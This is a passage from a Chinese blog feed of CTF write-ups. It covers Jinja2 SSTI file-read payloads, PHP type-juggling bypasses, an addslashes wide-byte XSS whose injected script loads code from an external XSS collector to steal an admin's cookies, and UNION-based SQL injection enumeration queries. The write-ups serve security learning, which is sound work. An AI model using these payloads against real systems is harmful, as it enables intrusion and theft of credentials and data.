class="line">Var f=fso.opentextfile(“http://example.com/opt/flag_example.txt”,1，true); </span><br><span class="line">s = f.ReadAll(); </span><br><span class="line">document.write(s);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/12/SSTI服务端模板注入/Image0010.png" alt><br>可以看到网站非常“委婉”的提示我们不要这么做。不过也就是说这么做也可以但是这里不提倡，之前做XSS的时候我就浏览过一些如何绕过这种弹窗保护机制，我觉得应该有可行之处，但是我还是希望能够按照正规步骤做题。</p><p>最终限于知识贫乏我只能去搜一下QCTF的内容。竟然在里面发现了原题！！</p><p>把源码粘上去发现，<br><img src="/2019/04/12/SSTI服务端模板注入/Image0011.png" alt><br>好了本文结束，这道题目具体做法就是搜一搜。</p><p>~~那是不可能的。既然找到正确答案了我们就必须知其所以然。</p><p>首先我们一开始的工作方向是正确的，我们已经找到了input点。但是这里用到了一个之前没有用过的注入技术。<strong>SSTI服务端门模板注入</strong>。</p><p><strong>SSTI</strong>网上的资料并不多，我查阅了自己的一些书籍，只在专门的web安全书籍（黑客攻防技术宝典（web篇））里面才有相关介绍，可能我查阅不够仔细这个内容在其它书里面只是涵盖在了某个专题里面。</p><p><strong>SSTI</strong>是针对模板进行攻击的。来看一个PHP模板的例子。</p><p>什么是模板，为什么要使用模板？</p><p>模板简单来说就是定义了一个通用的框架，但是框架里面的内容是动态解析的。比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;&#123;%$cont%&#125;&lt;/title&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>我们定义了一个HTML框架里面包含一个title标签但是至于标签里面是什么，现在不知道。</p><p>至于这个cont什么时候去填充，有两种。前端渲染，后端渲染。</p><p>前端渲染就是服务器一股脑把信息给浏览器，浏览器对信息先解析成HTML代码在渲染。</p><p>后端渲染是服务端把信息解析好了直接发给浏览器，浏览器仅进行渲染工作。</p><p>譬如说我们上边的模板页面起名为“index.html”。后端执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$temp-&gt;display(&apos;index.html&apos;, array(&apos;cont&apos; =&gt; $_GET[&apos;title&apos;]));</span><br></pre></td></tr></table></figure><p>这样页面的就变成“title”的值，比如是123，那么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;title&gt;123&lt;/title&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这令我想到了之前学习的织梦CMS。很显然，凡事用到用户输入的如果不加以处理必然会造成类似XSS的漏洞。题目来看的话这里必然存在后端渲染的漏洞。测试一下，输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/12/SSTI服务端模板注入/Image0012.png" alt><br>前端显示49，这是因为服务端把7*7进行了运算，像PHP的Twig模板不仅可以进行表达式运算还能输出变量的值，也可以用注释符的办法看看能不能输出注释内容来判断是否存在漏洞。由此来看模板漏洞也是因为么有对用户输入过滤引起的。</p><p>不过看了答案之后还是省了很多步骤，比如那张图片暗示了Python，这里的404页面其实不是Apache+PHP的构架，也就是说这里使用的并不是PHP 诸如Twig的模板，而是Python Flask jinja2。</p><p>这样我们只需要了解Flask jinja2的用法就可以找到植入payload的方法。<br>官文 <a href="http://docs.jinkan.org/docs/jinja2/" target="_blank" rel="noopener">http://docs.jinkan.org/docs/jinja2/</a> （其实不用看也可以因为只用到基本语法可以搜一下）</p><p>构造payload。构造payload使用到了Python的内建属性 官文 <a href="https://docs.python.org/2/library/stdtypes.html#file-objects" target="_blank" rel="noopener">https://docs.python.org/2/library/stdtypes.html#file-objects</a><br>由于我的Python还在起步阶段，在参考了大量资料后还是不能完全对这个payload进行最正确的解释（从做题到写文已经一天半了一直在看这个payload），这里给出我认为比较全的一个解释 转载 <a href="https://www.freebuf.com/articles/web/98928.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/98928.html</a><br>简单说一下我的理解就是我们需要用一个类型变量比如说一个空字符串，使用<strong>class</strong>来获取它的类型，并通过<strong>mro</strong>来获取对象的继承类。然后通过索引获取我们目标对象，再用<strong>subclass</strong>列出所有类，通过索引找到“file”类，有了“file”对象后就能使用read()来读取文件了。</p><p>所以payload代码是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/flag.txt&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/12/SSTI服务端模板注入/Image0013.png" alt><br>获得flag。</p><p>不过QCTF的答案还说到了过滤，虽然这道题目没有用到，但是说一下。</p><p>比如题目对<strong>class</strong>做了过滤的话，可以使用request.args来绕过。这个东西是flask模板里面用于获取GET参数的一个功能，所以我们可以吧<strong>class</strong>定义为字符串变量通过request.args来获取这样就绕过了过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;[request.args.a][request.args.b][2][request.args.c]()[40](&apos;/flag.txt&apos;)[request.args.d]()&#125;&#125;?a=__class__&amp;b=__mro__&amp;c=__subclasses__&amp;d=read</span><br></pre></td></tr></table></figure><p>这个思想类似于之前XSS使用的截取字符串构造 script 的思想。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;题目：&lt;/strong&gt;Confusion 1**&lt;br&gt;&lt;img src=&quot;/2019/04/12/SSTI服务端模板注入/Image0001.png&quot; alt&gt;&lt;br&gt;这道题目名字就叫 “困惑”，乍一看确实让人困惑，整个界面就是一张图片还有两个跳转，两个跳转还都是404。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP 漏洞</title>
    <link href="https://kkkiona.github.io/2019/04/10/PHP-%E6%BC%8F%E6%B4%9E/"/>
    <id>https://kkkiona.github.io/2019/04/10/PHP-漏洞/</id>
    <published>2019-04-10T09:39:02.000Z</published>
    <updated>2019-04-15T06:07:36.544Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>今天做了两道PHP漏洞利用的题目相比XSS和SQL简单不少。直接上题目。</p><p><strong>题目一</strong></p><p><img src="/2019/04/10/PHP-漏洞/Image0001.png" alt><br><a id="more"></a><br>意思很简单我们需要提交一个name变量一个password变量和一个test变量，用GET方式传输，并且test的MD5编码要等于’0’，name！=password，且name和password的SHA1是一样的。</p><p>第一个要求MD5=’0’的字符串，如果你想利用之前获取验证码的方法用代码去跑一个MD5等于’0’字符串是不可能的。这里就需要用到PHP的弱匹配特性。</p><p>！=和==在php中属于弱匹配，它会先进行数据类型转换在进行匹配。而===的话呢就不会转换数据类型，类型不相等就直接false了。</p><p>利用数据转换这一特点，根据PHP手册的描述：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。其中0e是科学计数法，因为涉及到数字内容，所以就会转换为数值，而0e830400451993494058024219903391转换为数值也就是0*(10^830400451993494058024219903391) = 0，因此只需找到生成的MD5值类似0exxxxxxxxx的字符串即可。，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s214587387a</span><br></pre></td></tr></table></figure></p><p>这些都是以’0E’开头的字符串。我们输入以下语句在URL里面<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?name=a&amp;password=b&amp;test=QNKCDZO</span><br></pre></td></tr></table></figure></p><p><img src="/2019/04/10/PHP-漏洞/Image0002.png" alt></p><p>第一关搞定。</p><p>那么怎么实现name！=password但是两者的SHA1值又一样呢，SHA1相同的两个数据是存在的，但是想通过穷举的方式来找十分困难，所以目标变放在了sha1()，这个函数上。构造name！=password很简单。对于php的sha1()函数如果加密成功则返回加密后的字符串，反之返回NULL。<br>那我们就想到能不能通过让两者都返回NULL就可以了，因为判断语句里面并没有检查返回结果是否为NULL。经过查询，sha1()不支持处理数组，那么我们只需要把name和password设置为数组就可以绕过了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?name[]=a&amp;password[]=b&amp;test=QNKCDZO</span><br></pre></td></tr></table></figure></p><p><img src="/2019/04/10/PHP-漏洞/Image0003.png" alt></p><p><strong>第二题</strong></p><p><img src="/2019/04/10/PHP-漏洞/Image0004.png" alt></p><p>第二题要求在config.php里面写入脚本，其实只要把过滤字符 ‘&lt;’ , ‘php’ 写进去就行。</p><p>可以看到脚本使用stripos()方法对 ‘&lt;’ , ‘php’ 字符进行了过滤处理。按照之前做XSS的方法我想到可不可以使用转码的方式绕过检测，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt</span><br></pre></td></tr></table></figure></p><p><img src="/2019/04/10/PHP-漏洞/Image0005.png" alt></p><p>可以字符直接显示了出来，php直接把它处理成了纯文本放到了body里面，此法不通。</p><p>试着查阅stripos()的相关漏洞，发现多数都是使用了此方法返回的是字符串所在位置，是一个int型，如果恰好返回0也就是非法字符位于开头，就可以破坏诸如 !stripos()的判断方式。但是题目里面直接使用了is_int()进行判断，所以无法使用此方法。</p><p>其实，我在思考这道题目的时候有点绕弯路了，费了一番周折之后我才想到可以同第一题一样让stripos()返回一个错误。经查阅stripos()也无法处理数组且返回NULL。那话不多说直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.php?content[]=&lt;</span><br></pre></td></tr></table></figure></p><p><img src="/2019/04/10/PHP-漏洞/Image0006.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天做了两道PHP漏洞利用的题目相比XSS和SQL简单不少。直接上题目。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;题目一&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/04/10/PHP-漏洞/Image0001.png&quot; alt&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS 题目解析（下篇）</title>
    <link href="https://kkkiona.github.io/2019/04/10/XSS-%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-%EF%BC%88%E4%B8%8B%E7%AF%87%EF%BC%89/"/>
    <id>https://kkkiona.github.io/2019/04/10/XSS-题目解析-（下篇）/</id>
    <published>2019-04-10T02:56:59.000Z</published>
    <updated>2019-04-15T05:50:07.285Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>第三题：XSS 2</strong></p><p><img src="/2019/04/10/XSS-题目解析-（下篇）/Image0001.png" alt><br>一样的题目，只不过xss.php文件不一样，直接点进去看看。<br><img src="/2019/04/10/XSS-题目解析-（下篇）/Image0002.png" alt><br>这个页面你输入什么东西都会被转换成字符串无论是”、&lt;、&gt; 还是Unicode编码。<br><img src="/2019/04/10/XSS-题目解析-（下篇）/Image0003.png" alt><br>可以发现敏感字符被转义了，Unicode被原样变换成了纯字符。</p><p>刚开始会有种手足无措的感觉，因为无论编码还是构造错误语法都没法突破。我决定按部就班从源头入手。<br>先来搞清楚出题者是怎么实现这个转换功能的。既然是php文件我认为这个转换也是依靠的php。果然php中的addslashes()方法会把内容无脑转成字符串从而让恶意代码失效。那么就可以查阅一下怎样绕过addslashes()了。这里我只说一下本题的解法，各种绕过姿势详见<a href="https://bbs.ichunqiu.com/thread-10899-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-10899-1-1.html</a><br><a id="more"></a><br>我这里是用的是宽字节方法，简单说一下就是“錦“字gbk编码是0xe55c，utf-8编码是0xe98ca6。当php的iconv把它从UTF-8转成gbk的时候会被翻译为%e5%5c，而%5c就是“\”，当我们输入“\” 是iconv会把它转成转义字符 “\” 编码是%5c%5c ，那么如果这么输入“錦\”，iconv 便把它转换成了 %e5%5c%5c%5c,也就是“閷�\”,可以看到最后的\逃出来了，输入“ 錦” ”，输出“閷””.OK,成功闭合。这种方法类似于SQL注入。</p><p>但是我们还面临一个问题，如果我们按照之前的方法使用createElement()的方法的话我们必然会用到 ‘ ，但是会被转义，如果用汉字破坏转义又会留有乱码，createElement(閷�’閷�’).显然这是不正确的语法。</p><p>接下来的方法比较笨拙仅仅是我个人的做法，希望读者能找出更好地做法。为了大家方便实现提示一下，这个页面除了做了字符串转换以外，还过滤掉了“&lt;”和“+”这两个符号，以防大家白费功夫。不过如果你的思路实在需要这些符号后面我也会说一下如何提取这些符号。</p><p>我想到的办法是反利用它原本的的字符串转换。我们很清楚我们需要</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var s=document.createElement(&apos;script&apos;);</span><br><span class="line">document.body.appendChild(s);</span><br><span class="line">s.src=&quot;http://xss.tf/Vw6&quot;;</span><br></pre></td></tr></table></figure><p>这段代码，但是这段代码，需要两个字符串，一个是标签名一个是地址名。恰好我们手里有一个现成的字符串变量<strong>a</strong>，没错，我的想法就是把要用到的字符串写到a变量里面然后截取。输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scripthttp://xss.tf/Vw6錦&quot;;//</span><br></pre></td></tr></table></figure><p><img src="/2019/04/10/XSS-题目解析-（下篇）/Image0004.png" alt><br>变量a里面已经写入了我们需要的代码，我们需要提取出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">scripthttp://xss.tf/Vw6錦&quot;;</span><br><span class="line">var s=document.createElement(a.substr(0,6));</span><br><span class="line">document.body.appendChild(s);</span><br><span class="line">s.src=a.substr(6,17);</span><br><span class="line">//</span><br></pre></td></tr></table></figure><p>通过substr()将需要的字符串截取了出来。提交一下看看。<br><img src="/2019/04/10/XSS-题目解析-（下篇）/Image0005.png" alt><br>完成。想必你的XSS平台也已经提示你了。</p><p>接下来只需要把它放到URL里面让admin上钩即可。但是这里还是要把他们转换成<strong>encodeURIComponent</strong>（这里只需转一次，不用先转Unicode）。因为题目指定URL不允许使用汉字空格等。<br><img src="/2019/04/10/XSS-题目解析-（下篇）/Image0006.png" alt><br>最后提交完成。<br><img src="/2019/04/10/XSS-题目解析-（下篇）/Image0007.png" alt><br>最后附上如何强行使用被过滤的符号，拿 &lt; 来说，我的思路依然是使用 a 字符串变量。<br>&lt; 的 encodeURIComponent 编码是%3c。也就是浏览器会把%3c解释为 &lt; 。那么我的思路就是不让浏览器解释我们自己来。我们再对%3c进行encodeURIComponent 编码得到%253c。我们把这个代码给URL看看会发生什么。<br><img src="/2019/04/10/XSS-题目解析-（下篇）/Image0008.png" alt><br><img src="/2019/04/10/XSS-题目解析-（下篇）/Image0009.png" alt><br>得到了 %3c没有问题。接下来就需要我们自己转码了。同样使用substr()截取到%3c然后用decodeURI() 函数解码。小示范：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%253c錦&quot;;</span><br><span class="line">alert(decodeURI(a.substr(0,3)));</span><br><span class="line">//</span><br></pre></td></tr></table></figure><p><img src="/2019/04/10/XSS-题目解析-（下篇）/Image0010.png" alt></p><p><strong>总结</strong></p><p>先说几点提示：<br>1、除了使用createElement()还可以用document.write()。但是后者的写入方式很迷，有时候会把你的数据当做字符串处理，而且需要用到转义字符，因为你的内容里面一定会有 ‘ 等标记部转译的话会发生错误。<br>2、XSS平台提供了很多注入方式，比如构造图片等等，但是图片方式的载入速度要慢一些。有可能会失败，比如再做后两道题的时候，第一道使用图片完全没有问题，但是第二道却不行。并且第一道题在使用图片注入的时候，你并不能立即获得报告，你需要再随便点一次提交才可以获得报告，我猜想是，第一次admin把脚本给了xss.php但是图片并没有加载，再次提交的时候刚才能让图片载入。但是第二道题就完全不可以了。这个问题我需要在研究一下。<br>3、如果你是用的是XSS Hunter做题的话，可能会因为延迟的问题导致你获取不到admin的cookies。因为它的服务器在海外，所以对js的访问速度要慢一些，可能会导致你抓包里面的内容不全。另外它的模块设置了如果你之前有它发送的邮件，它会自动把老邮件扔到垃圾箱，只保留最新的邮件。有一次因为漏写了 ; 导致代码反复运行发了50多封邮件给我，只能一个个查找哪个是admin发给我的。</p><p>总的来说XSS有点类似SQL注入，只不过这里用的是HTML、JS。虽然只是学习了初级阶段的内容但是还是非常有意思的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;第三题：XSS 2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/04/10/XSS-题目解析-（下篇）/Image0001.png&quot; alt&gt;&lt;br&gt;一样的题目，只不过xss.php文件不一样，直接点进去看看。&lt;br&gt;&lt;img src=&quot;/2019/04/10/XSS-题目解析-（下篇）/Image0002.png&quot; alt&gt;&lt;br&gt;这个页面你输入什么东西都会被转换成字符串无论是”、&amp;lt;、&amp;gt; 还是Unicode编码。&lt;br&gt;&lt;img src=&quot;/2019/04/10/XSS-题目解析-（下篇）/Image0003.png&quot; alt&gt;&lt;br&gt;可以发现敏感字符被转义了，Unicode被原样变换成了纯字符。&lt;/p&gt;
&lt;p&gt;刚开始会有种手足无措的感觉，因为无论编码还是构造错误语法都没法突破。我决定按部就班从源头入手。&lt;br&gt;先来搞清楚出题者是怎么实现这个转换功能的。既然是php文件我认为这个转换也是依靠的php。果然php中的addslashes()方法会把内容无脑转成字符串从而让恶意代码失效。那么就可以查阅一下怎样绕过addslashes()了。这里我只说一下本题的解法，各种绕过姿势详见&lt;a href=&quot;https://bbs.ichunqiu.com/thread-10899-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://bbs.ichunqiu.com/thread-10899-1-1.html&lt;/a&gt;&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQL 注入（UNION联合注入）</title>
    <link href="https://kkkiona.github.io/2019/04/09/SQL-%E6%B3%A8%E5%85%A5%EF%BC%88UNION%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%89/"/>
    <id>https://kkkiona.github.io/2019/04/09/SQL-注入（UNION联合注入）/</id>
    <published>2019-04-09T15:44:23.000Z</published>
    <updated>2019-04-15T06:07:40.742Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>SQL注入原理上跟XSS接近，也是因为对用户的输入信息不做检查而导致的漏洞。<br>比如有一个登录页面它不加检查的把用户输入信息放到SQL语句中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT *  FROM users WHERE username = &apos;用户输入信息&apos;  AND password = &apos;&apos;用户输入信息&apos;</span><br></pre></td></tr></table></figure></p><p>如果我们输入的信息是 <strong>“admin’ –”</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT *  FROM users WHERE username = &apos;admin&apos;  -- AND password = &apos;&apos;用户输入信息&apos;</span><br></pre></td></tr></table></figure></p><p>可以看到由于 <strong>‘</strong>  闭合了用户名称的查询使得 – 逃出，从而注释掉了 password的检查。成功使得admin账户登录。</p><p>由于SQL注入的方式有很多，这道题目我选择了<strong>UNION联合注入方式</strong>。<br><a id="more"></a><br><strong>题目</strong><br><img src="/2019/04/09/SQL-注入（UNION联合注入）/Image0001.png" alt><br>目标页面是一个新闻页面，可以通过搜索栏查询新闻。</p><p>首先查看有无注入点，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;</span><br></pre></td></tr></table></figure></p><p>点击确定发现页面报错，说明存在注入点，写入的’影响了SQL语句的执行。</p><p>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; --</span><br></pre></td></tr></table></figure></p><p>报错，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; #</span><br></pre></td></tr></table></figure></p><p>正常，可能页面设置了WAF把“–”字符屏蔽了，但是“#”注释可以使用，输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; OR 1=1 #</span><br></pre></td></tr></table></figure></p><p>正常显示出所有新闻，1=1的结果恒成立，加上OR逻辑运算相当于对所有数据进行访问。继续输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; ORDER BY 1 #</span><br></pre></td></tr></table></figure></p><p>没有报错，更改 ORDER BY 的数字，到4的时候报错，说明有3列。ORDER BY 是访问的数据按照第几列排序的意思，输入4的时候出错可见表格只有3列。列数可能比较多的时候推荐用二分法。</p><p>知道了有几列就可以使用UNION联合查询语句了。</p><p>UNION可以把两个查询语句的结果放在一起输出，比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT name,sex FROM user UNION SELECT month,day FROM date</span><br></pre></td></tr></table></figure></p><p>显示结果是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">张三      男</span><br><span class="line">2月      3日</span><br></pre></td></tr></table></figure></p><p>之所以要获取表单列数，是因为UNION的使用前提是多次查询的列数必须保持一致，否则会报错。</p><p>由于我们不知道每一列的数据类型，因此我们可以使用可以随意转换类型的NULL类型来试探。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; UNION SELECT NULL,NULL,NULL #</span><br></pre></td></tr></table></figure></p><p>没问题，再试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; UNION SELECT &apos;a&apos;,NULL,NULL #</span><br></pre></td></tr></table></figure></p><p>也没问题，看一下你的数据有没有在什么地方显示出来，如果没有继续试探。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; UNION SELECT NULL,NULL,&apos;a&apos; #</span><br></pre></td></tr></table></figure></p><p>试探到第三例的时候，发现查找内容显示在了页面内。<br><img src="/2019/04/09/SQL-注入（UNION联合注入）/Image0002.png" alt><br>那么就可以用这一位作我们的显示位，来查询的各种信息了。逐行输入下面的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&apos; UNION SELECT NULL,NULL,@@version #  // 数据库版本   </span><br><span class="line"></span><br><span class="line">&apos; UNION SELECT NULL,NULL,user() #  // 用户信息</span><br><span class="line"></span><br><span class="line">&apos; UNION SELECT  NULL,NULL,session_user()#    // 当前用户</span><br><span class="line"></span><br><span class="line">&apos; UNION SELECT  NULL,NULL,database()#    // 数据库名称</span><br><span class="line"></span><br><span class="line">&apos; UNION SELECT NULL,NULL,@@datadir#  /数据库路径</span><br><span class="line"></span><br><span class="line">&apos; UNION SELECT NULL,NULL,@@basedir#  //数据库安装路径</span><br><span class="line"></span><br><span class="line">&apos; UNION SELECT  NULL,NULL,@@version_compile_os# //操作系统</span><br><span class="line"></span><br><span class="line">// 使用group_concat()一次性显示： </span><br><span class="line"></span><br><span class="line">&apos; UNION SELECT  NULL,NULL,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA #     //获取所有数据库</span><br><span class="line"></span><br><span class="line">&apos; UNION SELECT NULL,NULL, (select group_concat(table_name) from information_schema.tables where table_schema=&apos;&apos;数据库名) #  //数据库全部表名</span><br><span class="line"></span><br><span class="line">&apos; UNION SELECT  NULL,NULL, (select group_concat(column_name) from information_schema.columns where table_schema=&apos;数据库名&apos; and table_name=&apos;表名&apos;) #   //表的全部列名</span><br><span class="line"></span><br><span class="line">&apos; UNION SELECT NULL,NULL,列名 from 表名 # // 根据上面获取的 表名、列名查找信息</span><br></pre></td></tr></table></figure></p><p>最终通过对获取的数据成功找到flag。<br><img src="/2019/04/09/SQL-注入（UNION联合注入）/Image0003.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL注入原理上跟XSS接近，也是因为对用户的输入信息不做检查而导致的漏洞。&lt;br&gt;比如有一个登录页面它不加检查的把用户输入信息放到SQL语句中。&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;SELECT *  FROM users WHERE username = &amp;apos;用户输入信息&amp;apos;  AND password = &amp;apos;&amp;apos;用户输入信息&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果我们输入的信息是 &lt;strong&gt;“admin’ –”&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;SELECT *  FROM users WHERE username = &amp;apos;admin&amp;apos;  -- AND password = &amp;apos;&amp;apos;用户输入信息&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以看到由于 &lt;strong&gt;‘&lt;/strong&gt;  闭合了用户名称的查询使得 – 逃出，从而注释掉了 password的检查。成功使得admin账户登录。&lt;/p&gt;
&lt;p&gt;由于SQL注入的方式有很多，这道题目我选择了&lt;strong&gt;UNION联合注入方式&lt;/strong&gt;。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>VPS服务器搭建SSR/SS</title>
    <link href="https://kkkiona.github.io/2019/04/09/VPS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BASSR_SS/"/>
    <id>https://kkkiona.github.io/2019/04/09/VPS服务器搭建SSR_SS/</id>
    <published>2019-04-09T02:56:59.000Z</published>
    <updated>2019-04-15T06:07:49.136Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>实在是忍受不了国内博客论坛千篇一律的抄袭现象，决定去翻阅一下国外的资料。但又因为国内现成的VPN基本全被封杀，即便是有几个可以用的也会收费并且非常不稳定，于是决定自己动手打一个梯子。<br>服务器：<strong>vultr</strong>（比较实惠、稳定的国外服务器）<br>工具：<strong>xshell</strong>、<strong>shadowstocks</strong>、<strong>bbr</strong>、<strong>代理服务设置工具</strong>（下边会给出链接）<br>首先是搞到服务器，去vultr注册账号。<a href="https://www.vultr.com/" target="_blank" rel="noopener">https://www.vultr.com/</a><br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0001.png" alt><br>填写邮箱和密码，会给你发个邮件激活账号。<br><a id="more"></a><br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0002.png" alt><br>先进性账户充值，充值最低10美元起。<br><img src="/2019/04/09/VPS服务器搭建SSR_SS/Image0003.png" 